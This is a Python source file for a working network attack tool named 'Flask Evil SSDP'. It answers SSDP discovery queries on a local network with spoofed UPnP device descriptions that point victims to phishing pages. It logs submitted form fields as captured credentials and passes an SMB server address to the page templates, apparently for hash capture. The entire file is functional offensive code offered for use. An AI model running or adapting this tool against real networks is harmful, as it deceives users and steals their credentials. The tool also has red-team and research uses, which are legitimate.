#!/usr/bin/env python3

import os
import re
import sys
import socket
import struct
import argparse
import logging
import netifaces
import random
import time
from datetime import datetime
from ipaddress import ip_address
from multiprocessing import Process
from flask import Flask, render_template_string, request, redirect, abort, send_from_directory
from email.utils import formatdate


class Colors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

    @staticmethod
    def header(text):
        return f"{Colors.CYAN}{Colors.BOLD}[*]{Colors.END} {text}"

    @staticmethod
    def success(text):
        return f"{Colors.GREEN}{Colors.BOLD}[+]{Colors.END} {text}"

    @staticmethod
    def info(text):
        return f"{Colors.BLUE}{Colors.BOLD}[i]{Colors.END} {text}"

    @staticmethod
    def warning(text):
        return f"{Colors.YELLOW}{Colors.BOLD}[!]{Colors.END} {text}"

    @staticmethod
    def error(text):
        return f"{Colors.RED}{Colors.BOLD}[x]{Colors.END} {text}"

    @staticmethod
    def alert(text):
        return f"{Colors.RED}{Colors.BOLD}[*]{Colors.END} {text}"


class SSDPListener:
    MCAST_GROUP = '239.255.255.250'
    SSDP_PORT = 1900
    VALID_ST = re.compile(r'^[a-zA-Z0-9.\-_]+:[a-zA-Z0-9.\-_:]+$')

    def __init__(self, local_ip: str, local_port: int, templates_config: list, analyze: bool = False):
        self.local_ip = local_ip
        self.local_port = local_port
        self.templates_config = templates_config
        self.analyze = analyze
        self.known_hosts = []

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('', self.SSDP_PORT))

        mreq = struct.pack('4s4s', socket.inet_aton(self.MCAST_GROUP), socket.inet_aton(local_ip))
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

    @staticmethod
    def _gen_usn() -> str:
        parts = [8, 4, 4, 4, 12]
        return 'uuid:' + '-'.join(''.join(random.choices('0123456789abcdef', k=n)) for n in parts)

    def send_location(self, address, st, template_idx):
        url = f'http://{self.local_ip}:{self.local_port}/ssdp/{template_idx}/device-desc.xml'
        date = formatdate(timeval=None, localtime=False, usegmt=True)
        usn = self.templates_config[template_idx]['session_usn']

        response = (
            f'HTTP/1.1 200 OK\r\n'
            f'CACHE-CONTROL: max-age=1800\r\n'
            f'DATE: {date}\r\n'
            f'EXT:\r\n'
            f'LOCATION: {url}\r\n'
            f'OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n'
            f'01-NLS: {usn}\r\n'
            f'SERVER: UPnP/1.0\r\n'
            f'ST: {st}\r\n'
            f'USN: {usn}::{st}\r\n'
            f'BOOTID.UPNP.ORG: 0\r\n'
            f'CONFIGID.UPNP.ORG: 1\r\n'
            f'\r\n'
        ).encode('utf-8')

        self.sock.sendto(response, address)

    def process_packet(self, data: bytes, address):
        remote_ip = address[0]
        match = re.search(br'(?i)\r\nST:(.*?)\r\n', data)
        if b'M-SEARCH' in data and match:
            st = match.group(1).decode('utf-8', errors='ignore').strip()
            if self.VALID_ST.match(st):
                if (remote_ip, st) not in self.known_hosts:
                    print(Colors.info(f"New host detected: {Colors.BOLD}{remote_ip}{Colors.END} (ST: {st})"))
                    self.known_hosts.append((remote_ip, st))
                if not self.analyze:
                    for idx in range(len(self.templates_config)):
                        self.send_location(address, st, idx)
                        time.sleep(0.05)
            else:
                print(Colors.warning(f"Suspicious ST received: {st} from {remote_ip}"))

    def listen_forever(self):
        while True:
            try:
                data, addr = self.sock.recvfrom(1024)
                self.process_packet(data, addr)
            except Exception as e:
                print(Colors.error(f"SSDP listener error: {e}"))


def create_app(config):
    app = Flask(__name__, template_folder=config['templates_dir'][0] if config['templates_dir'] else '')
    app.config['TEMPLATES_AUTO_RELOAD'] = True
    
    logging.getLogger('werkzeug').setLevel(logging.ERROR)
    app.logger.setLevel(logging.ERROR)

    templates_config = config['templates_config']
    log_file = 'logs-essdp.txt'

    def log(data: str):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(log_file, 'a') as f:
            f.write(f"{timestamp}:    {data}\n")
        print(data)

    device_xmls = {}
    for idx, tpl_config in enumerate(templates_config):
        device_xml_path = os.path.join(tpl_config['template_dir'], 'device.xml')
        device_xmls[idx] = open(device_xml_path).read() if os.path.exists(device_xml_path) else ''

    @app.route('/ssdp/<int:template_idx>/device-desc.xml')
    def device_desc(template_idx):
        if template_idx >= len(templates_config):
            return abort(404)
        tpl_config = templates_config[template_idx]
        tpl_context = tpl_config.copy()
        tpl_context['template_idx'] = template_idx
        xml = render_template_string(device_xmls[template_idx], **tpl_context)
        print(Colors.header(f"XML Request [Template {template_idx}: {tpl_config['name']}] - Host: {request.remote_addr} UA: {request.headers.get('User-Agent', 'Unknown')[:50]}"))
        return xml, 200, {'Content-Type': 'application/xml'}

    @app.route('/ssdp/<int:template_idx>/service-desc.xml')
    def service_desc(template_idx):
        if template_idx >= len(templates_config):
            return abort(404)
        return '.', 200, {'Content-Type': 'application/xml'}

    @app.route('/ssdp/<int:template_idx>/hook.html', methods=['POST'])
    def hook(template_idx):
        if template_idx >= len(templates_config):
            return abort(404)
        tpl_config = templates_config[template_idx]
        creds = request.form.to_dict()
        msg = Colors.alert(f"Credentials captured [Template {template_idx}: {tpl_config['name']}] - Host: {request.remote_addr}")
        log(msg)
        for key, value in creds.items():
            log(f"  {key}: {value}")
        redirect_url = tpl_config.get('redirect_url') or f"http://{tpl_config['local_ip']}:{tpl_config['local_port']}/ssdp/{template_idx}/present.html"
        return redirect(redirect_url)

    @app.route('/favicon.ico')
    def favicon():
        return '', 404

    @app.route('/present.html')
    def present_html_generic():
        return redirect('/ssdp/0/present.html')

    @app.route('/ssdp/<int:template_idx>/<path:filename>')
    def serve_template_file(template_idx, filename):
        if template_idx >= len(templates_config):
            print(Colors.warning(f"Template index {template_idx} out of range"))
            return abort(404)
        tpl_config = templates_config[template_idx]
        file_path = os.path.join(tpl_config['template_dir'], filename)
        
        if not os.path.abspath(file_path).startswith(os.path.abspath(tpl_config['template_dir'])):
            return abort(403)
        
        if filename == 'present.html':
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    html = f.read()
                tpl_context = tpl_config.copy()
                tpl_context['template_idx'] = template_idx
                html_rendered = render_template_string(html, **tpl_context)
                ua = request.headers.get('User-Agent', 'Unknown')
                print(Colors.success(f"Phishing page served [Template {template_idx}: {tpl_config['name']}] - Host: {request.remote_addr} UA: {ua[:50]}"))
                return html_rendered, 200, {'Content-Type': 'text/html'}
            else:
                print(Colors.warning(f"File not found: {file_path}"))
                return abort(404)
        else:
            try:
                return send_from_directory(tpl_config['template_dir'], filename)
            except FileNotFoundError:
                print(Colors.warning(f"Static file not found: {file_path}"))
                return abort(404)

    return app


def get_interface_ip(interface: str) -> str:
    try:
        addrs = netifaces.ifaddresses(interface)
        return addrs[netifaces.AF_INET][0]['addr']
    except Exception as e:
        print(Colors.error(f"Could not get IP for interface {interface}: {e}"))
        sys.exit(1)


def validate_smb_ip(smb_ip: str, local_ip: str) -> str:
    try:
        ip_address(smb_ip)
        return smb_ip
    except ValueError:
        print(Colors.warning("Invalid SMB IP. Using local IP."))
        return local_ip


def list_templates(script_dir: str):
    templates_dir = os.path.join(script_dir, 'templates')
    
    if not os.path.isdir(templates_dir):
        print(Colors.error(f"Templates directory not found: {templates_dir}"))
        sys.exit(1)
    
    try:
        templates = [d for d in os.listdir(templates_dir) if os.path.isdir(os.path.join(templates_dir, d))]
        
        if not templates:
            print(Colors.warning("No templates found"))
            sys.exit(0)
        
        print(f"\n{Colors.success('Available templates:')}\n")
        for template in sorted(templates):
            print(f"  • {template}")
        print()
        sys.exit(0)
    except Exception as e:
        print(Colors.error(f"Error listing templates: {e}"))
        sys.exit(1)


def print_banner(args, local_ip, templates_config):
    print("\n" + "─" * 70)
    print(Colors.BOLD + Colors.CYAN + "  FLASK EVIL SSDP - MULTI-TEMPLATE SERVER" + Colors.END)
    print("─" * 70)
    print(f"  {Colors.BOLD}Interface:{Colors.END}           {args.interface} ({local_ip})")
    print(f"  {Colors.BOLD}HTTP Server:{Colors.END}         http://{local_ip}:{args.port}")
    print(f"  {Colors.BOLD}Active Templates:{Colors.END}    {len(templates_config)}")
    if args.analyze:
        print(f"  {Colors.BOLD}Mode:{Colors.END}               {Colors.YELLOW}ANALYZE (no SSDP responses){Colors.END}")
    print("─" * 70)
    
    for idx, tpl_cfg in enumerate(templates_config):
        print(f"\n  {Colors.BOLD}Template {idx}: {tpl_cfg['name']}{Colors.END}")
        print(f"    • Device XML:     /ssdp/{idx}/device-desc.xml")
        print(f"    • Hook Endpoint:  /ssdp/{idx}/hook.html")
        print(f"    • Redirect URL:   {tpl_cfg.get('redirect_url', '(default)')}")
        print(f"    • SMB Server:     {tpl_cfg['smb_server']}")
    
    print("\n" + "─" * 70 + "\n")


def main():
    parser = argparse.ArgumentParser(description="Flask Evil SSDP - Multi-Template UPnP Spoofing Server")
    parser.add_argument('interface', nargs='?', help='Network interface to bind to')
    parser.add_argument('-p', '--port', type=int, default=8888, metavar='PORT', help='HTTP port (default: 8888)')
    parser.add_argument('-t', '--templates', nargs='+', metavar='TEMPLATE', help='Template names (space-separated)')
    parser.add_argument('-s', '--smb', metavar='SMB', help='SMB server IP (default: local IP)')
    parser.add_argument('-u', '--urls', nargs='+', metavar='URL', default=[], help='Redirect URLs for each template')
    parser.add_argument('-a', '--analyze', action='store_true', help='Analyze mode (no SSDP responses)')
    parser.add_argument('-L', '--list', action='store_true', help='List available templates')

    args = parser.parse_args()
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    if args.list:
        list_templates(script_dir)
    
    if not args.interface:
        parser.error("interface is required (or use -L to list templates)")
    if not args.templates or len(args.templates) == 0:
        parser.error("--templates/-t is required with at least one template (or use -L to list templates)")
    
    args.interface = re.sub(r'[^a-zA-Z0-9._-]', '', args.interface)

    if args.templates == ['all']:
        templates_dir = os.path.join(script_dir, 'templates')
        if os.path.isdir(templates_dir):
            args.templates = sorted([d for d in os.listdir(templates_dir) if os.path.isdir(os.path.join(templates_dir, d))])
            if not args.templates:
                print(Colors.warning("No templates found in templates/"))
                sys.exit(1)
            print(Colors.success(f"Loading all templates: {', '.join(args.templates)}\n"))
        else:
            print(Colors.error(f"Templates directory not found: {templates_dir}"))
            sys.exit(1)

    local_ip = get_interface_ip(args.interface)
    smb_server = validate_smb_ip(args.smb, local_ip) if args.smb else local_ip

    templates_config = []
    for idx, template_name in enumerate(args.templates):
        template_dir = os.path.join(script_dir, 'templates', template_name)
        
        if not os.path.isdir(template_dir):
            print(Colors.error(f"Template directory not found: {template_dir}"))
            sys.exit(1)
        
        redirect_url = args.urls[idx] if idx < len(args.urls) else ''
        
        tpl_config = {
            'name': template_name,
            'template_dir': template_dir,
            'local_ip': local_ip,
            'local_port': args.port,
            'smb_server': smb_server,
            'session_usn': SSDPListener._gen_usn(),
            'redirect_url': redirect_url,
        }
        templates_config.append(tpl_config)

    print_banner(args, local_ip, templates_config)

    listener = SSDPListener(local_ip, args.port, templates_config, args.analyze)
    ssdp_process = Process(target=listener.listen_forever)
    ssdp_process.daemon = True
    ssdp_process.start()

    app = create_app({
        'templates_config': templates_config,
        'templates_dir': [cfg['template_dir'] for cfg in templates_config]
    })
    try:
        app.run(host=local_ip, port=args.port, threaded=True, use_reloader=False)
    except KeyboardInterrupt:
        print(f"\n{Colors.warning('Shutting down...')}")
    finally:
        ssdp_process.terminate()
        sys.exit(0)


if __name__ == '__main__':
    main()